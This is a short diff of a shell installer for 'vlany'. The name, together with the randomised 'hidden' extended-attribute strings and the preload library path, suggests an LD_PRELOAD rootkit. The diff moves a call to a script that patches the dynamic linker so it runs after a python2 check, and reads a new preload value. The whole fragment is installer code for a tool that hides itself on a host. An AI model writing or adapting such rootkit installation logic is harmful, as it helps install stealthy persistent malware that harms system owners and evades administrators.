@@ -172,7 +172,6 @@ get_vlany_settings ()
     HIDDEN_XATTR_1_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     HIDDEN_XATTR_2_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     LIB_LOCATION="${INSTALL}/${OBJECT_FILE_NAME}.so.\$PLATFORM"
-    NEW_PRELOAD=$(cat new_preload)
 }
 
 config_vlany ()
@@ -262,6 +261,9 @@ fi
 
 PYTHON_BIN=`which python2`
 [ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }
+
+misc/patch_ld.py
+NEW_PRELOAD=$(cat new_preload)
 
 if [ "$1" == "--cli" ]; then
     echo "Installing vlany without a tui."
